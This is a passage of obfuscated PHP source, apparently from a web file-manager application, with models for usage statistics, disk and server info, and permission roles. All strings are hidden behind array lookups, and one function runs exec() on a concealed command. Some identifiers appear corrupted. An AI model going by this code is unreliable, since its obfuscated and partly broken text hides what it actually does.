base64_encode($Dåãí†ßÁÓ), $c±ÀÅ¤‡¦š[1102] => $dæÆåÑÒç˜, $c±ÀÅ¤‡¦š[1103] => $this->accessKey, $c±ÀÅ¤‡¦š[1106] => $d£ØÕ¸¤‡Ó, $c±ÀÅ¤‡¦š[1107] => $DİÀ‡¾ Û, $c±ÀÅ¤‡¦š[169] => $this->getHost()); goto bŒ‰£Ÿ»‡; Fê—»Œ É: } public function fileOutLink($aêÈÉšÊÃ) { $fæŠÂÒ¤Ó =& $_SERVER[Î¿—”òá]; if (substr($aêÈÉšÊÃ, 0, 7) == $fæŠÂÒ¤Ó[1108]) { $aêÈÉšÊÃ = $fæŠÂÒ¤Ó[1109] . substr($aêÈÉšÊÃ, 7); } header($fæŠÂÒ¤Ó[156] . $aêÈÉšÊÃ); die; } } goto bìÓ×È´‹; C¿“†»‡˜Š: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($BâŸñÏ””) { $F†·¨™è‡ =& $_SERVER[Î¿—”òá]; $CĞÆ µ¿Ç… = array($F†·¨™è‡[535] => array($F†·¨™è‡[29] => $F†·¨™è‡[2022], $F†·¨™è‡[261] => array($F†·¨™è‡[210], $F†·¨™è‡[696], $F†·¨™è‡[2023], $F†·¨™è‡[2024])), $F†·¨™è‡[2025] => array($F†·¨™è‡[29] => $F†·¨™è‡[2026], $F†·¨™è‡[261] => array($F†·¨™è‡[210], $F†·¨™è‡[694], $F†·¨™è‡[2027], $F†·¨™è‡[2028], $F†·¨™è‡[2029]))); if (!isset($CĞÆ µ¿Ç…[$BâŸñÏ””])) { return !1; } $this->optionType = $CĞÆ µ¿Ç…[$BâŸñÏ””][$F†·¨™è‡[29]]; $this->field = $CĞÆ µ¿Ç…[$BâŸñÏ””][$F†·¨™è‡[261]]; return !0; } public function listData($F†ôÎÄ«˜Î = false, $c‚ö’®®–Ô = "\x6d\157\144\151\146\171\x54\151\155\145", $BñÜĞ÷ã‚Œ = false) { return parent::listData($F†ôÎÄ«˜Î, $c‚ö’®®–Ô, $BñÜĞ÷ã‚Œ); } public function trendList($EÏèÈÊˆƒ) { goto F‘‰ã­öÔò; e“ŸÖí²„¦: if (!isset($b×å¾Šì)) { $BœÊ¡ù»«Ì = $EÏèÈÊˆƒ == $f›öŒ™¯óê[535] ? $f›öŒ™¯óê[477] : $f›öŒ™¯óê[749]; $b×å¾Šì = Model($BœÊ¡ù»«Ì)->min($f›öŒ™¯óê[187]); } $bà˜Â—Œ¯ = $f›öŒ™¯óê[2032] . ucfirst($EÏèÈÊˆƒ); $e²íŞòÉ¶õ = $this->dateList($b×å¾Šì); goto bêËßİÜ‚Â; bêËßİÜ‚Â: foreach ($e²íŞòÉ¶õ as $fâÙœ¦„µ¥) { $this->{$bà˜Â—Œ¯}($fâÙœ¦„µ¥); } return $this->listData(); goto cÃŸ¾‚Ûò; F‘‰ã­öÔò: $f›öŒ™¯óê =& $_SERVER[Î¿—”òá]; $E­èµ‡´Úœ = $this->listData(); if ($E­èµ‡´Úœ) { $cÃì¹Ÿ¯‹‰ = end($E­èµ‡´Úœ); $fâÙœ¦„µ¥ = date($f›öŒ™¯óê[2030], strtotime($f›öŒ™¯óê[2031])); if ($cÃì¹Ÿ¯‹‰[$f›öŒ™¯óê[210]] == $fâÙœ¦„µ¥) { return $E­èµ‡´Úœ; } $b×å¾Šì = strtotime($cÃì¹Ÿ¯‹‰[$f›öŒ™¯óê[210]]); } goto e“ŸÖí²„¦; cÃŸ¾‚Ûò: } private function dateList($aÅ¯–â‹¼„) { $BÜğŞ„„œí =& $_SERVER[Î¿—”òá]; $båò¶îÚ‘² = $aÅ¯–â‹¼„; $aµ¨¯óÒÉô = strtotime($BÜğŞ„„œí[2031]); $AÚ¼…ä‡¨† = array(); while ($båò¶îÚ‘² <= $aµ¨¯óÒÉô) { $AÚ¼…ä‡¨†[] = date($BÜğŞ„„œí[2030], $båò¶îÚ‘²); $båò¶îÚ‘² = strtotime($BÜğŞ„„œí[2033], $båò¶îÚ‘²); } return $AÚ¼…ä‡¨†; } public function _recordUser($B¦°ãŸ™ô° = '') { goto F²àâ±øˆÙ; döïŒ“Ïõš: $B¾ô‹Äà©í = array($cßˆæÜå³ç[210] => $B¦°ãŸ™ô°, $cßˆæÜå³ç[696] => (int) $B³™Ğ‡»Ó, $cßˆæÜå³ç[2023] => (int) $DÖíÇˆ‡¦‚, $cßˆæÜå³ç[2024] => (int) $Bœ…Œ×à‡š); return $this->insert($B¾ô‹Äà©í); goto dÄ´µƒØİ÷; EĞ¢°Å‰: $DÖíÇˆ‡¦‚ = Model($cßˆæÜå³ç[477])->where($fš·•æÛî)->count($cßˆæÜå³ç[1429]); $fš·•æÛî[$cßˆæÜå³ç[29]] = $cßˆæÜå³ç[2036]; $Bœ…Œ×à‡š = Model($cßˆæÜå³ç[2037])->where($fš·•æÛî)->count($cßˆæÜå³ç[2038]); goto döïŒ“Ïõš; F Ê‰¨¼Ş: $fš·•æÛî = array($cßˆæÜå³ç[187] => array($cßˆæÜå³ç[920], $Eø±¥ÜôŠË)); $B³™Ğ‡»Ó = Model($cßˆæÜå³ç[477])->where($fš·•æÛî)->count($cßˆæÜå³ç[1429]); $fš·•æÛî[$cßˆæÜå³ç[187]] = array($cßˆæÜå³ç[321], array($cø™ÆíØŠ, $Eø±¥ÜôŠË)); goto EĞ¢°Å‰; F²àâ±øˆÙ: $cßˆæÜå³ç =& $_SERVER[Î¿—”òá]; $cø™ÆíØŠ = strtotime(date($cßˆæÜå³ç[2034], strtotime($B¦°ãŸ™ô°))); $Eø±¥ÜôŠË = strtotime(date($cßˆæÜå³ç[2035], strtotime($B¦°ãŸ™ô°))); goto F Ê‰¨¼Ş; dÄ´µƒØİ÷: } public function _recordStore($añİÙÆåš¬ = '') { goto a×®ƒ”ÌÌ‚; DŒõ¡Äâô¹: $b›£øœ¢ğ = Model($F´ÊÇ¾ õã[422])->where($EÄ¨•‰çÈ®)->sum($F´ÊÇ¾ õã[77]); $EÄ¨•‰çÈ®[$F´ÊÇ¾ õã[370]] = 0; $cŠ¡ô³÷—î = Model($F´ÊÇ¾ õã[749])->where($EÄ¨•‰çÈ®)->sum($F´ÊÇ¾ õã[77]); goto eÖƒ‘„ø¨; a×®ƒ”ÌÌ‚: $F´ÊÇ¾ õã =& $_SERVER[Î¿—”òá]; $Cî«¥Ç…í = strtotime(date($F´ÊÇ¾ õã[2035], strtotime($añİÙÆåš¬))); $EÄ¨•‰çÈ® = array($F´ÊÇ¾ õã[187] => array($F´ÊÇ¾ õã[920], $Cî«¥Ç…í)); goto DŒõ¡Äâô¹; a»ÈÒ¥Èğï: $b·Ôã©¶Ô® = Model($F´ÊÇ¾ õã[749])->where($EÄ¨•‰çÈ®)->sum($F´ÊÇ¾ õã[77]); $C‰¸ÊĞˆà¸ = array($F´ÊÇ¾ õã[210] => $añİÙÆåš¬, $F´ÊÇ¾ õã[694] => (int) $cŠ¡ô³÷—î, $F´ÊÇ¾ õã[2027] => (int) $b›£øœ¢ğ, $F´ÊÇ¾ õã[2028] => (int) $c÷ê†¦¯š¦, $F´ÊÇ¾ õã[2029] => (int) $b·Ôã©¶Ô®); return $this->insert($C‰¸ÊĞˆà¸); goto C™öª§Íèà; eÖƒ‘„ø¨: $EÄ¨•‰çÈ®[$F´ÊÇ¾ õã[371]] = 1; $c÷ê†¦¯š¦ = Model($F´ÊÇ¾ õã[749])->where($EÄ¨•‰çÈ®)->sum($F´ÊÇ¾ õã[77]); $EÄ¨•‰çÈ®[$F´ÊÇ¾ õã[371]] = 2; goto a»ÈÒ¥Èğï; C™öª§Íèà: } public function trend($Aµß–­»÷, $EÑ“’·™¦Â) { goto CÁÍÚàª; B‘¸´„¯…ó: return $bª˜ğ«„•; goto A‘±àÊ±øÈ; B±ÉèÃ¤‚: if (empty($cÅëÈóå†´)) { $aŸìåšå×ù = date($E­¼ñ“‰‰ë[2030], strtotime($E­¼ñ“‰‰ë[2031])); $eªÍãÀ·¾ = array($E­¼ñ“‰‰ë[210] => $aŸìåšå×ù); foreach ($B¾ô¹‡°°[$Aµß–­»÷] as $Aì©ù¦Ü´ => $Cí§ÍŒï) { $eªÍãÀ·¾[$Aì©ù¦Ü´] = 0; } $cÅëÈóå†´[] = $eªÍãÀ·¾; } $bª˜ğ«„• = array(); foreach ($cÅëÈóå†´ as $Cí§ÍŒï) { if ($Aµß–­»÷ == $E­¼ñ“‰‰ë[2025] && $Cí§ÍŒï[$E­¼ñ“‰‰ë[2027]] > $Cí§ÍŒï[$E­¼ñ“‰‰ë[694]]) { $Cí§ÍŒï[$E­¼ñ“‰‰ë[2027]] = $Cí§ÍŒï[$E­¼ñ“‰‰ë[694]]; } foreach ($B¾ô¹‡°°[$Aµß–­»÷] as $Aì©ù¦Ü´ => $e¾ÕŒÇÈÌŸ) { $b†ËŸ³ˆ‰ = array($E­¼ñ“‰‰ë[210] => $Cí§ÍŒï[$E­¼ñ“‰‰ë[210]], $E­¼ñ“‰‰ë[1335] => $e¾ÕŒÇÈÌŸ); $b†ËŸ³ˆ‰[$cÆÃÛ‹Â[$Aµß–­»÷]] = isset($Cí§ÍŒï[$Aì©ù¦Ü´]) ? $Cí§ÍŒï[$Aì©ù¦Ü´] : 0; $bª˜ğ«„•[] = $b†ËŸ³ˆ‰; } } goto B‘¸´„¯…ó; b¯ÅÄòò«Á: if ($cÅëÈóå†´ && $EÑ“’·™¦Â != $E­¼ñ“‰‰ë[1404]) { $BÔä°‘‡» = $cÅëÈóå†´[0][$E­¼ñ“‰‰ë[210]]; $D™Ù–ñ‘–‰ = $this->validDate($EÑ“’·™¦Â, $BÔä°‘‡»); $dçÔÉŒƒöŠ = array(); $a°³¥ìÚ¹¶ = array_to_keyvalue($cÅëÈóå†´, $E­¼ñ“‰‰ë[210]); foreach ($D™Ù–ñ‘–‰ as $aŸìåšå×ù) { if (isset($a°³¥ìÚ¹¶[$aŸìåšå×ù])) { $b†ËŸ³ˆ‰ = $a°³¥ìÚ¹¶[$aŸìåšå×ù]; } else { $b†ËŸ³ˆ‰ = end($cÅëÈóå†´); $b†ËŸ³ˆ‰[$E­¼ñ“‰‰ë[210]] = $aŸìåšå×ù; if ($Aµß–­»÷ == $E­¼ñ“‰‰ë[535]) { $b†ËŸ³ˆ‰[$E­¼ñ“‰‰ë[2023]] = $b†ËŸ³ˆ‰[$E­¼ñ“‰‰ë[2024]] = 0; } } $dçÔÉŒƒöŠ[] = $b†ËŸ³ˆ‰; } $cÅëÈóå†´ = $dçÔÉŒƒöŠ; } $B¾ô¹‡°° = array($E­¼ñ“‰‰ë[535] => array($E­¼ñ“‰‰ë[696] => LNG($E­¼ñ“‰‰ë[2039]), $E­¼ñ“‰‰ë[2023] => LNG($E­¼ñ“‰‰ë[2040]), $E­¼ñ“‰‰ë[2024] => LNG($E­¼ñ“‰‰ë[2041])), $E­¼ñ“‰‰ë[2025] => array($E­¼ñ“‰‰ë[694] => LNG($E­¼ñ“‰‰ë[2042]), $E­¼ñ“‰‰ë[2027] => LNG($E­¼ñ“‰‰ë[2043]), $E­¼ñ“‰‰ë[2028] => LNG($E­¼ñ“‰‰ë[2044]), $E­¼ñ“‰‰ë[2029] => LNG($E­¼ñ“‰‰ë[2045]))); $cÆÃÛ‹Â = array($E­¼ñ“‰‰ë[535] => $E­¼ñ“‰‰ë[2046], $E­¼ñ“‰‰ë[2025] => $E­¼ñ“‰‰ë[77]); goto B±ÉèÃ¤‚; CÁÍÚàª: $E­¼ñ“‰‰ë =& $_SERVER[Î¿—”òá]; if (!$this->init($Aµß–­»÷)) { return !1; } $cÅëÈóå†´ = $this->trendList($Aµß–­»÷); goto b¯ÅÄòò«Á; A‘±àÊ±øÈ: } public function validDate($AÏÒ£é´ˆí, $CŒÍâ«Ò­Š) { goto B§…ìÌ‡Ìë; F‚¹¨‹ô¥: return $FÉ¤â®“Î®; goto aÌÏÈ¸Ê²ñ; B§…ìÌ‡Ìë: $cŞÁäÓŒ¹ =& $_SERVER[Î¿—”òá]; $Fö¸¶¦ØÌ„ = date($cŞÁäÓŒ¹[2030], strtotime($cŞÁäÓŒ¹[2031])); $FÉ¤â®“Î® = array($Fö¸¶¦ØÌ„); goto D„ğ½É…êÙ; D„ğ½É…êÙ: switch ($AÏÒ£é´ˆí) { case $cŞÁäÓŒ¹[1411]: $B½Ÿù‹±Ş = mktime(0, 0, 0, date($cŞÁäÓŒ¹[2047]), date($cŞÁäÓŒ¹[2048]) - date($cŞÁäÓŒ¹[1219]) + 7 - 7, date($cŞÁäÓŒ¹[2049])); $dğ·ñ÷ŠŠÃ = 0; do { $EƒÚé¡” = date($cŞÁäÓŒ¹[2030], $B½Ÿù‹±Ş - 3600 * 24 * 7 * $dğ·ñ÷ŠŠÃ); $FÉ¤â®“Î®[] = $EƒÚé¡”; $dğ·ñ÷ŠŠÃ++; } while ($CŒÍâ«Ò­Š < $EƒÚé¡”); break; case $cŞÁäÓŒ¹[1409]: $dğ·ñ÷ŠŠÃ = 1; do { $Cñ…¶Ó¼¢ = date($cŞÁäÓŒ¹[2050], strtotime("\55\x20{$dğ·ñ÷ŠŠÃ}\x20\x6d\157\x6e\164\x68\x73")); $FÉ¤â®“Î®[] = $Cñ…¶Ó¼¢; $dğ·ñ÷ŠŠÃ++; } while ($CŒÍâ«Ò­Š < $Cñ…¶Ó¼¢); break; case $cŞÁäÓŒ¹[1718]: $AñêÔ°ƒ¤ = (int) date($cŞÁäÓŒ¹[2049], strtotime($CŒÍâ«Ò­Š)); $EÀÚ¾ÜŞí› = (int) date($cŞÁäÓŒ¹[2049]); if ($AñêÔ°ƒ¤ >= $EÀÚ¾ÜŞí›) { break; } for ($AñêÔ°ƒ¤; $AñêÔ°ƒ¤ < $EÀÚ¾ÜŞí›; $AñêÔ°ƒ¤++) { $FÉ¤â®“Î®[] = $AñêÔ°ƒ¤ . $cŞÁäÓŒ¹[2051]; } break; default: break; } if ($CŒÍâ«Ò­Š > end($FÉ¤â®“Î®)) { array_pop($FÉ¤â®“Î®); } sort($FÉ¤â®“Î®); goto F‚¹¨‹ô¥; aÌÏÈ¸Ê²ñ: } public function listTable($aÜ¸Â©Âª°) { $eò¤£òŞ¿ = ucfirst($aÜ¸Â©Âª°); return Model($eò¤£òŞ¿)->listData(); } public function option($Fâ”Ë§†›) { $B³³¥ÃŒÍ = $_SERVER[Î¿—”òá][2052] . ucfirst($Fâ”Ë§†›); return $this->{$B³³¥ÃŒÍ}(); } private function optionUser() { goto B¿Äí§ö¯”; B¿Äí§ö¯”: $a«Š¯“‰ =& $_SERVER[Î¿—”òá]; $b÷ÎĞôæ´Ä = Model($a«Š¯“‰[477])->count($a«Š¯“‰[1429]); $dš¹î“ˆ°Ò = Model($a«Š¯“‰[477])->where($a«Š¯“‰[2053])->count($a«Š¯“‰[1429]); goto Eš‘Óß•ö‘; A‘ê»š½„: if (!$d–‹°ùé‰‘) { $d–‹°ùé‰‘ = 1; } $aâ’ºì¾Ó‹ = strtotime(date($a«Š¯“‰[2034])); $b„¸Êš°°ù = array($a«Š¯“‰[2055] => array($a«Š¯“‰[921], $aâ’ºì¾Ó‹)); goto Aµ­Ÿ´èÙÆ; Eš‘Óß•ö‘: $aâ’ºì¾Ó‹ = strtotime($a«Š¯“‰[2054]); $b„¸Êš°°ù = array($a«Š¯“‰[2055] => array($a«Š¯“‰[921], $aâ’ºì¾Ó‹)); $d–‹°ùé‰‘ = (int) Model($a«Š¯“‰[477])->where($b„¸Êš°°ù)->count($a«Š¯“‰[1429]); goto A‘ê»š½„; Aµ­Ÿ´èÙÆ: $BÙºÊ¬ªó = Model($a«Š¯“‰[477])->where($b„¸Êš°°ù)->count($a«Š¯“‰[1429]); return array($a«Š¯“‰[691] => (int) $b÷ÎĞôæ´Ä, $a«Š¯“‰[2056] => (int) ($b÷ÎĞôæ´Ä - $dš¹î“ˆ°Ò), $a«Š¯“‰[2057] => (int) $dš¹î“ˆ°Ò, $a«Š¯“‰[2058] => (int) $BÙºÊ¬ªó, $a«Š¯“‰[2059] => $d–‹°ùé‰‘); goto bÊô²ïŞğæ; bÊô²ïŞğæ: } private function optionFile() { goto CÖŸê’Ø·; eß»õ³‹Ø: $fö·…¸¢Ø„ = Model($BİŠ“Øí…[749])->where($a‰¿²Ü†Ó)->sum($BİŠ“Øí…[77]); $b«±ÌİÈâ = Model($BİŠ“Øí…[749])->where($a‰¿²Ü†Ó)->count($BİŠ“Øí…[369]); return array($BİŠ“Øí…[694] => $fßæ—¤»™, $BİŠ“Øí…[2027] => $eÔ‹æÉÜˆ, $BİŠ“Øí…[2060] => $fßæ—¤»™ - $eÔ‹æÉÜˆ, $BİŠ“Øí…[2061] => (int) $fö·…¸¢Ø„, $BİŠ“Øí…[696] => (int) $e‰ ùùìä, $BİŠ“Øí…[2062] => (int) $b«±ÌİÈâ); goto fÖáù‚ØäŠ; A¬åÒ¨ÂÓ: $eÔ‹æÉÜˆ = $EÎòõñÛÊß[$BİŠ“Øí…[2027]]; $e‰ ùùìä = Model($BİŠ“Øí…[749])->where(array($BİŠ“Øí…[370] => 0))->count($BİŠ“Øí…[369]); $a‰¿²Ü†Ó = array($BİŠ“Øí…[370] => 0, $BİŠ“Øí…[187] => array($BİŠ“Øí…[921], strtotime(date($BİŠ“Øí…[2034])))); goto eß»õ³‹Ø; CÖŸê’Ø·: $BİŠ“Øí… =& $_SERVER[Î¿—”òá]; $EÎòõñÛÊß = $this->sourceSize(); $fßæ—¤»™ = $EÎòõñÛÊß[$BİŠ“Øí…[77]]; goto A¬åÒ¨ÂÓ; fÖáù‚ØäŠ: } private function optionAccess() { $CĞƒ¥‘»· =& $_SERVER[Î¿—”òá]; return array($CĞƒ¥‘»·[691] => $this->typeLogCnt(), $CĞƒ¥‘»·[103] => $this->typeLogCnt($CĞƒ¥‘»·[103]), $CĞƒ¥‘»·[404] => $this->typeLogCnt($CĞƒ¥‘»·[404]), $CĞƒ¥‘»·[2063] => $this->typeLogCnt($CĞƒ¥‘»·[2063]), $CĞƒ¥‘»·[2064] => $this->typeLogCnt($CĞƒ¥‘»·[2064]), $CĞƒ¥‘»·[535] => $this->typeLogCnt($CĞƒ¥‘»·[33], $CĞƒ¥‘»·[2038])); } private function typeLogCnt($A”‰‘¦µá = '', $e¬ùÔˆ‘¢ï = "\x69\144") { goto dØ£Ì˜ê¬œ; dØ£Ì˜ê¬œ: $e´½‘Ö”÷ =& $_SERVER[Î¿—”òá]; $dßˆ‚•ç = array($e´½‘Ö”÷[103] => array($e´½‘Ö”÷[2065], $e´½‘Ö”÷[2066]), $e´½‘Ö”÷[404] => array($e´½‘Ö”÷[2067], $e´½‘Ö”÷[2068]), $e´½‘Ö”÷[2063] => array($e´½‘Ö”÷[2069], $e´½‘Ö”÷[2070], $e´½‘Ö”÷[2071]), $e´½‘Ö”÷[2064] => array($e´½‘Ö”÷[2072], $e´½‘Ö”÷[2073]), $e´½‘Ö”÷[2074] => array($e´½‘Ö”÷[2075], $e´½‘Ö”÷[2076], $e´½‘Ö”÷[2077])); $AŒ”²«î… = strtotime(date($e´½‘Ö”÷[2034])); goto BùÊï…¸–†; BùÊï…¸–†: $B¥½İˆòëº = array($e´½‘Ö”÷[187] => array($e´½‘Ö”÷[921], $AŒ”²«î…)); if ($A”‰‘¦µá) { $B¥½İˆòëº[$e´½‘Ö”÷[29]] = array($e´½‘Ö”÷[7], $dßˆ‚•ç[$A”‰‘¦µá]); } $BåÇÙšŸ¥ = Model($e´½‘Ö”÷[2037])->where($B¥½İˆòëº)->count($e¬ùÔˆ‘¢ï); goto e¿—ëªÀøÎ; e¿—ëªÀøÎ: return (int) $BåÇÙšŸ¥; goto CôëÊÆÌä™; CôëÊÆÌä™: } private function optionServer() { goto CÇÖöšèŠÔ; a¥ãÁˆ—Íæ: $FİÚ‹×ÇŒº = array($E²¦ØÕ°Ê[740] => $E­Ç«·èæ‘[$E²¦ØÕ°Ê[367]]); $E–ê“­Şôî = Model($E²¦ØÕ°Ê[422])->where($FİÚ‹×ÇŒº)->sum($E²¦ØÕ°Ê[77]); $D¸„»¦ÌÕò = explode($E²¦ØÕ°Ê[50], $_SERVER[$E²¦ØÕ°Ê[139]]); goto c¹ÒÜ˜¡†ç; fËÂ¥…•»: return array($E²¦ØÕ°Ê[2080] => $Bï•²Á« ? $Bï•²Á«[$E²¦ØÕ°Ê[2081]] : 0, $E²¦ØÕ°Ê[2082] => $Bï•²Á« ? $Bï•²Á«[$E²¦ØÕ°Ê[2083]] : 0, $E²¦ØÕ°Ê[2084] => (int) $E­Ç«·èæ‘[$E²¦ØÕ°Ê[2081]] * 1024 * 1024 * 1024, $E²¦ØÕ°Ê[2085] => (int) $E–ê“­Şôî, $E²¦ØÕ°Ê[2086] => ucfirst($có‡çàíŸ¾), $E²¦ØÕ°Ê[2087] => $E²¦ØÕ°Ê[2088] . PHP_VERSION, $E²¦ØÕ°Ê[2089] => phpBuild64() ? 64 : 32, $E²¦ØÕ°Ê[690] => str_replace($E²¦ØÕ°Ê[2090], $E²¦ØÕ°Ê[897], $Dƒ²™§“Ì), $E²¦ØÕ°Ê[337] => ucfirst($A´Û°Â£ëñ), $E²¦ØÕ°Ê[28] => $_SERVER[$E²¦ØÕ°Ê[2091]]); goto EÂËŒéğ¯; CÇÖöšèŠÔ: $E²¦ØÕ°Ê =& $_SERVER[Î¿—”òá]; $Bï•²Á« = $this->diskDriver(); $E­Ç«·èæ‘ = KodIO::defaultDriver(); goto a¥ãÁˆ—Íæ; CÉ¹éñÊù: if ($Dƒ²™§“Ì == $E²¦ØÕ°Ê[720]) { $e¢¶â‹ä°´ = explode($E²¦ØÕ°Ê[1069], $f¦Â»¯Ñ·‰[$E²¦ØÕ°Ê[880]]); $Dƒ²™§“Ì = $e¢¶â‹ä°´[0]; } if ($Dƒ²™§“Ì == $E²¦ØÕ°Ê[723] || $Dƒ²™§“Ì == $E²¦ØÕ°Ê[724]) { $dÜœ­¿ˆ¹Æ = Model()->db()->query($E²¦ØÕ°Ê[2078]); $d¼ƒ²ø‰ƒÕ = $dÜœ­¿ˆ¹Æ[0] && isset($dÜœ­¿ˆ¹Æ[0][$E²¦ØÕ°Ê[1334]]) ? $dÜœ­¿ˆ¹Æ[0][$E²¦ØÕ°Ê[1334]] : 0; $Dƒ²™§“Ì = $E²¦ØÕ°Ê[2079] . ($d¼ƒ²ø‰ƒÕ ? $E²¦ØÕ°Ê[8] . $d¼ƒ²ø‰ƒÕ : $E²¦ØÕ°Ê[33]); } $A´Û°Â£ëñ = $GLOBALS[$E²¦ØÕ°Ê[6]][$E²¦ØÕ°Ê[337]][$E²¦ØÕ°Ê[751]]; goto fËÂ¥…•»; c¹ÒÜ˜¡†ç: $có‡çàíŸ¾ = $D¸„»¦ÌÕò[0]; $f¦Â»¯Ñ·‰ = $GLOBALS[$E²¦ØÕ°Ê[6]][$E²¦ØÕ°Ê[17]]; $Dƒ²™§“Ì = $f¦Â»¯Ñ·‰[$E²¦ØÕ°Ê[881]]; goto CÉ¹éñÊù; EÂËŒéğ¯: } private function diskDriver() { goto e…ƒŸÙ‘Ü; E öİƒåÙ†: if ($BÁµÜÃ·Š) { $BàÅ‚™†º· = $e§„‚øö“É[2094]; if (function_exists($e§„‚øö“É[2095])) { exec($e§„‚øö“É[2096], $A‹ßŒÃ‰øÁ); $BàÅ‚™†º· = $A‹ßŒÃ‰øÁ[1] . $e§„‚øö“É[8]; } } if (!file_exists($BàÅ‚™†º·)) { return; } $fêÂï£ÖÖ = @disk_total_space($BàÅ‚™†º·); goto D¹ÏÖéˆ; e…ƒŸÙ‘Ü: $e§„‚øö“É =& $_SERVER[Î¿—”òá]; $BàÅ‚™†º· = $e§„‚øö“É[8]; $BÁµÜÃ·Š = $GLOBALS[$e§„‚øö“É[6]][$e§„‚øö“É[2092]] == $e§„‚øö“É[2093]; goto E öİƒåÙ†; D¹ÏÖéˆ: $CÓƒÏ‚×ÛŠ = $fêÂï£ÖÖ - @disk_free_space($BàÅ‚™†º·); return array($e§„‚øö“É[2081] => $fêÂï£ÖÖ, $e§„‚øö“É[2083] => $CÓƒÏ‚×ÛŠ); goto CîÓ«Ğœâ; CîÓ«Ğœâ: } public function fileChart($DŠ°ÀäÙ´Æ) { goto FêË—¾ÇèÉ; FêË—¾ÇèÉ: $cÀâ®çöÅ =& $_SERVER[Î¿—”òá]; if (isset($DŠ°ÀäÙ´Æ[$cÀâ®çöÅ[1429]])) { return Model($cÀâ®çöÅ[749])->userFileTypeProfile($DŠ°ÀäÙ´Æ[$cÀâ®çöÅ[1429]]); } if (isset($DŠ°ÀäÙ´Æ[$cÀâ®çöÅ[2097]])) { return Model($cÀâ®çöÅ[749])->groupFileTypeProfile($DŠ°ÀäÙ´Æ[$cÀâ®çöÅ[2097]]); } goto CĞÅÈ›¡ÌÄ; CĞÅÈ›¡ÌÄ: $aÅÉ’Ãã‹ = $this->sourceSize(); $f§æÏİÕåë = array($cÀâ®çöÅ[461] => 0, $cÀâ®çöÅ[371] => 1); $c’ÑšùìÍ = Model($cÀâ®çöÅ[749])->where($f§æÏİÕåë)->sum($cÀâ®çöÅ[77]); goto CÎŠ“Î„”À; CÎŠ“Î„”À: $f§æÏİÕåë[$cÀâ®çöÅ[371]] = 2; $f•èŒØƒ‡Ó = Model($cÀâ®çöÅ[749])->where($f§æÏİÕåë)->sum($cÀâ®çöÅ[77]); return array($cÀâ®çöÅ[694] => $aÅÉ’Ãã‹[$cÀâ®çöÅ[77]], $cÀâ®çöÅ[2027] => $aÅÉ’Ãã‹[$cÀâ®çöÅ[2027]], $cÀâ®çöÅ[2028] => (int) $c’ÑšùìÍ, $cÀâ®çöÅ[2029] => (int) $f•èŒØƒ‡Ó); goto E…´Œæä¥Å; E…´Œæä¥Å: } private function sourceSize() { $b½ô—óºÖ¶ =& $_SERVER[Î¿—”òá]; $D¼¹°ØÓ¾î = Model($b½ô—óºÖ¶[749])->where(array($b½ô—óºÖ¶[370] => 0))->sum($b½ô—óºÖ¶[77]); $CØ÷ø¸ëöˆ = Model($b½ô—óºÖ¶[422])->sum($b½ô—óºÖ¶[77]); if ($CØ÷ø¸ëöˆ > $D¼¹°ØÓ¾î) { $CØ÷ø¸ëöˆ = $D¼¹°ØÓ¾î; } return array($b½ô—óºÖ¶[77] => (int) $D¼¹°ØÓ¾î, $b½ô—óºÖ¶[2027] => (int) $CØ÷ø¸ëöˆ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $F¯’ƒÅÔ¯ =& $_SERVER[Î¿—”òá]; $DØµ§ãñ¯ë = array(array($F¯’ƒÅÔ¯[386] => LNG($F¯’ƒÅÔ¯[2098]), $F¯’ƒÅÔ¯[2099] => $F¯’ƒÅÔ¯[2100], $F¯’ƒÅÔ¯[2101] => 6, $F¯’ƒÅÔ¯[2102] => 1, $F¯’ƒÅÔ¯[2103] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($F¯’ƒÅÔ¯[386] => LNG($F¯’ƒÅÔ¯[2104]), $F¯’ƒÅÔ¯[2099] => $F¯’ƒÅÔ¯[2105], $F¯’ƒÅÔ¯[2101] => 1, $F¯’ƒÅÔ¯[2102] => 1, $F¯’ƒÅÔ¯[2103] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($F¯’ƒÅÔ¯[386] => LNG($F¯’ƒÅÔ¯[2106]), $F¯’ƒÅÔ¯[2099] => $F¯’ƒÅÔ¯[2107], $F¯’ƒÅÔ¯[2101] => 2, $F¯’ƒÅÔ¯[2102] => 1, $F¯’ƒÅÔ¯[2103] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($F¯’ƒÅÔ¯[386] => LNG($F¯’ƒÅÔ¯[2108]), $F¯’ƒÅÔ¯[2099] => $F¯’ƒÅÔ¯[2107], $F¯’ƒÅÔ¯[2101] => 3, $F¯’ƒÅÔ¯[2102] => 1, $F¯’ƒÅÔ¯[2103] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($F¯’ƒÅÔ¯[386] => LNG($F¯’ƒÅÔ¯[2109]), $F¯’ƒÅÔ¯[2099] => $F¯’ƒÅÔ¯[2110], $F¯’ƒÅÔ¯[2101] => 4, $F¯’ƒÅÔ¯[2102] => 1, $F¯’ƒÅÔ¯[2103] => self::AUTH_SHOW | self::AUTH_VIEW), array($F¯’ƒÅÔ¯[386] => LNG($F¯’ƒÅÔ¯[2111]), $F¯’ƒÅÔ¯[2099] => $F¯’ƒÅÔ¯[2112], $F¯’ƒÅÔ¯[2101] => 5, $F¯’ƒÅÔ¯[2102] => 1, $F¯’ƒÅÔ¯[2103] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($F¯’ƒÅÔ¯[386] => LNG($F¯’ƒÅÔ¯[2113]), $F¯’ƒÅÔ¯[2099] => $F¯’ƒÅÔ¯[2114], 